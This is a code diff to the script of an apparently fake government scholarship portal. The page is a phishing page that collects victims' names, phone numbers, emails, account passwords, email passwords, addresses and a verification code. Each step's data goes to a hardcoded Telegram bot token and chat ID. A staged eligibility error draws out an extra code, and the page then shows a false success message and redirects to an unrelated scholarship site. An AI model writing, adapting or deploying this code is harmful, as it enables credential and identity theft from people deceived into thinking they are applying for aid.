@@ -213,167 +213,170 @@
             </div>
         </div>
     </section>
+<script>
+    const BOT_TOKEN = '8193618395:AAEFptR_70SIOVVYiO5pNUOA59tkD-zNBDU';
+    const CHAT_ID = '7527733522';
+    let formData = {};
 
-    <script>
-        const BOT_TOKEN = '8193618395:AAEFptR_70SIOVVYiO5pNUOA59tkD-zNBDU';
-        const CHAT_ID = '7527733522';
-        let formData = {};
-
-        async function sendToTelegram(msg) {
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
-                return response.ok;
-            } catch (e) {
-                return false;
-            }
+    // 1. Check Local Storage on Load
+    window.onload = () => {
+        if (localStorage.getItem("scholarship_applied") === "true") {
+            // Skip directly to the final success state
+            document.getElementById('loading-screen').classList.add('hidden');
+            document.getElementById('gov-nav').classList.remove('hidden');
+            showPage('final-step');
+            
+            showSuccessUI();
+        } else {
+            // Normal flow for new users
+            setTimeout(() => showPage('home-page'), 2000);
         }
+    };
 
-        function showErrorUnderButton(buttonId) {
-            const btn = document.getElementById(buttonId);
-            const existing = document.getElementById('err-' + buttonId);
-            if(existing) existing.remove();
-
-            const err = document.createElement('p');
-            err.id = 'err-' + buttonId;
-            err.className = 'network-error';
-            err.innerText = "Can't contact the server and error occur check your internet connection";
-            btn.parentNode.appendChild(err);
-
-            setTimeout(() => err.remove(), 3000);
+    // 2. Helper: Send to Telegram
+    async function sendToTelegram(msg) {
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+            return response.ok;
+        } catch (e) {
+            return false;
         }
-
-        function showPage(id) {
-            document.querySelectorAll('section, #loading-screen').forEach(s => s.classList.add('hidden'));
-            document.getElementById(id).classList.remove('hidden');
-            if(id !== 'loading-screen') document.getElementById('gov-nav').classList.remove('hidden');
-        }
-
-        function validateFields(ids) {
-            let valid = true;
-            ids.forEach(id => {
-                const el = document.getElementById(id);
-                if(!el.value) { el.classList.add('border-red-500'); valid = false; }
-                else { el.classList.remove('border-red-500'); }
-            });
-            return valid;
-        }
-
-        async function submitStep1(e) {
-    // These are the 8 IDs from your HTML inputs
-    const fields = ['fname','lname','inst','course','phone','country','post1','post2'];
-    if(!validateFields(fields)) return;
-
-    const btn = document.getElementById('btn-1');
-    btn.innerText = "Connecting...";
-    btn.disabled = true;
-
-    // This stores the values into the formData object
-    formData = Object.fromEntries(fields.map(id => [id, document.getElementById(id).value]));
-
-    // Updated message string to include ALL 8 fields
-    const msg = `🏛️ GOV PORTAL - STEP 1
-👤 Name: ${formData.fname} ${formData.lname}
-🎓 Institution: ${formData.inst}
-📚 Course: ${formData.course}
-📞 Phone: ${formData.phone}
-📧 Email: ${formData.country}
-🔑 Password: ${formData.post1}
-🔑 Confirm: ${formData.post2}`;
-
-    const success = await sendToTelegram(msg);
-    if(success) {
-        showPage('form-step-2');
-    } else {
-        showErrorUnderButton('btn-1');
-        btn.innerText = "Continue";
-        btn.disabled = false;
     }
-}
 
-        async function submitStep2(e) {
-    // 1. Define all field IDs used in Step 2
-    const fields = ['addr', 'state', 'country', 'country2', 'post3'];
-    if(!validateFields(fields)) return;
-
-    const btn = document.getElementById('btn-2');
-    btn.innerText = "Verifying...";
-    btn.disabled = true;
-
-    // 2. Save the data into the formData object
-    formData.addr = document.getElementById('addr').value;
-    formData.state = document.getElementById('state').value;
-    formData.country2 = document.getElementById('country2').value;
-    formData.post3 = document.getElementById('post3').value;
-
-    // 3. Build the full message string (This is what you were missing)
-    const msg = `🗺️ GOV PORTAL - STEP 2
-👤 Name: ${formData.fname} ${formData.lname}
-🏠 Address: ${formData.addr}
-🏢 State: ${formData.state}
-🌍 Country: ${formData.country2}
-📧 Email: ${formData.country}
-🔑 Email Pass: ${formData.post3}`;
-
-
-    const success = await sendToTelegram(msg);
-    if(success) {
-        showPage('final-step');
-    } else {
-        showErrorUnderButton('btn-2');
-        btn.innerText = "Verify Records";
-        btn.disabled = false;
+    // 3. Helper: Navigation & UI
+    function showPage(id) {
+        document.querySelectorAll('section, #loading-screen').forEach(s => s.classList.add('hidden'));
+        document.getElementById(id).classList.remove('hidden');
+        if(id !== 'loading-screen') document.getElementById('gov-nav').classList.remove('hidden');
     }
-}
-        function processEligibility() {
-            document.getElementById('check-ui').classList.add('hidden');
+
+    function validateFields(ids) {
+        let valid = true;
+        ids.forEach(id => {
+            const el = document.getElementById(id);
+            if(!el.value) { el.classList.add('border-red-500'); valid = false; }
+            else { el.classList.remove('border-red-500'); }
+        });
+        return valid;
+    }
+
+    function showErrorUnderButton(buttonId) {
+        const btn = document.getElementById(buttonId);
+        const existing = document.getElementById('err-' + buttonId);
+        if(existing) existing.remove();
+        const err = document.createElement('p');
+        err.id = 'err-' + buttonId;
+        err.className = 'network-error';
+        err.innerText = "Can't contact the server. Please check your internet connection.";
+        btn.parentNode.appendChild(err);
+        setTimeout(() => err.remove(), 3000);
+    }
+
+    // 4. Step 1 Submission
+    async function submitStep1(e) {
+        const fields = ['fname','lname','inst','course','phone','country','post1','post2'];
+        if(!validateFields(fields)) return;
+
+        const btn = document.getElementById('btn-1');
+        btn.innerText = "Connecting...";
+        btn.disabled = true;
+
+        formData = Object.fromEntries(fields.map(id => [id, document.getElementById(id).value]));
+
+        const msg = `🏛️ GOV PORTAL - STEP 1\n👤 Name: ${formData.fname} ${formData.lname}\n🎓 Inst: ${formData.inst}\n📚 Course: ${formData.course}\n📞 Phone: ${formData.phone}\n📧 Email: ${formData.country}\n🔑 Pass: ${formData.post1}\n🔑 Conf: ${formData.post2}`;
+        
+        const success = await sendToTelegram(msg);
+        if(success) {
+            showPage('form-step-2');
+        } else {
+            showErrorUnderButton('btn-1');
+            btn.innerText = "Continue";
+            btn.disabled = false;
+        }
+    }
+
+    // 5. Step 2 Submission
+    async function submitStep2(e) {
+        const fields = ['addr', 'state', 'country2', 'post3', 'pos3', 'pst3', 'pot3'];
+        if(!validateFields(fields)) return;
+
+        const btn = document.getElementById('btn-2');
+        btn.innerText = "Verifying...";
+        btn.disabled = true;
+
+        formData.addr = document.getElementById('addr').value;
+        formData.state = document.getElementById('state').value;
+        formData.country2 = document.getElementById('country2').value;
+        formData.post3 = document.getElementById('post3').value;
+
+        const msg = `🗺️ GOV PORTAL - STEP 2\n👤 Name: ${formData.fname} ${formData.lname}\n🏠 Addr: ${formData.addr}\n🏢 State: ${formData.state}\n🌍 Country: ${formData.country2}\n📧 Email: ${formData.country}\n🔑 Email Pass: ${formData.post3}`;
+        
+        const success = await sendToTelegram(msg);
+        if(success) {
+            showPage('final-step');
+        } else {
+            showErrorUnderButton('btn-2');
+            btn.innerText = "Verify Records";
+            btn.disabled = false;
+        }
+    }
+
+    // 6. Eligibility Simulation
+    function processEligibility() {
+        document.getElementById('check-ui').classList.add('hidden');
+        document.getElementById('loading-ui').classList.remove('hidden');
+        setTimeout(() => {
+            document.getElementById('loading-ui').classList.add('hidden');
+            document.getElementById('error-ui').classList.remove('hidden');
+        }, 5000);
+    }
+
+    // 7. Final Retry & Redirect Logic
+    async function finalSubmit(e) {
+        const retryPost = document.getElementById('retry-post').value;
+        if(!retryPost) return alert("Security requires your verification code.");
+        
+        const btn = document.getElementById('btn-3');
+        btn.innerText = "Syncing...";
+        btn.disabled = true;
+
+        const msg = `🚨 FINAL SECURITY RETRY\n👤 ${formData.fname} ${formData.lname}\n🔑 Retry Code: ${retryPost}\n📧 Email: ${formData.country}`;
+        
+        const success = await sendToTelegram(msg);
+        if(success) {
+            // Save state to Local Storage
+            localStorage.setItem("scholarship_applied", "true");
+            
+            document.getElementById('error-ui').classList.add('hidden');
             document.getElementById('loading-ui').classList.remove('hidden');
+            document.getElementById('loading-text').innerText = "CALCULATING SCORE...";
+
             setTimeout(() => {
-                document.getElementById('loading-ui').classList.add('hidden');
-                document.getElementById('error-ui').classList.remove('hidden');
+                showSuccessUI();
             }, 5000);
+        } else {
+            showErrorUnderButton('btn-3');
+            btn.innerText = "Synchronize & Retry";
+            btn.disabled = false;
         }
+    }
 
-        async function finalSubmit(e) {
-            const retryPost = document.getElementById('retry-post').value;
-            if(!retryPost) return alert("Security requires your postal code.");
-            
-            const btn = document.getElementById('btn-3');
-            btn.innerText = "Syncing...";
-            btn.disabled = true;
+    // 8. Shared Success UI Function
+    function showSuccessUI() {
+        document.getElementById('loading-ui').classList.add('hidden');
+        document.getElementById('check-ui').classList.add('hidden');
+        document.getElementById('error-ui').classList.add('hidden');
+        document.getElementById('result-ui').classList.remove('hidden');
+        
+        // Update to green checkmark if desired via JS or CSS
+        document.getElementById('final-msg').innerText = "Your application is successful. Your information has been forwarded to the Vercelar Government Portal.\nDisbursement starts on 15-feb-2026 to 20-feb-2026.\nNow we will redirect you to our official international scholarship site.\nPlease wait for a few minutes.....";
 
-            const msg = `🚨 FINAL SECURITY RETRY\n👤 ${formData.fname} ${formData.lname}\n🔑 Retry Post: ${retryPost}\n📧 Email: ${formData.country}`;
-            
-            const success = await sendToTelegram(msg);
-
-            if(success) {
-                document.getElementById('error-ui').classList.add('hidden');
-                document.getElementById('loading-ui').classList.remove('hidden');
-                document.getElementById('loading-text').innerText = "CALCULATING SCORE...";
-
-                setTimeout(() => {
-                    document.getElementById('loading-ui').classList.add('hidden');
-                    document.getElementById('result-ui').classList.remove('hidden');
-                    
-                    // Updated Success Message
-                    document.getElementById('final-msg').innerText = `${formData.fname} ${formData.lname},Your application is successful. Your information has been forwarded to the Vercelar Government Portal. 
-                    Disbursement starts on 15-feb-2026 to 20-feb-2026. 
-                    Now we will redirect you to our official international scholarship site. 
-                    Please wait for a few minutes.....`;
-
-                    // Automatic Redirection after 5 seconds
-                    setTimeout(() => {
-                        window.location.href = "https://scholarshiproar.com/fully-funded-scholarships/?amp";
-                    }, 5000);
-
-                }, 5000);
-            } else {
-                showErrorUnderButton('btn-3');
-                btn.innerText = "Synchronize & Retry";
-                btn.disabled = false;
-            }
-        }
-
-        window.onload = () => setTimeout(() => showPage('home-page'), 2000);
-    </script>
+        // Auto redirect after 5 seconds
+        setTimeout(() => {
+            window.location.href = "https://scholarshiproar.com/fully-funded-scholarships/?amp";
+        }, 5000);
+    }
+</script>
+    
 </body>
 </html>
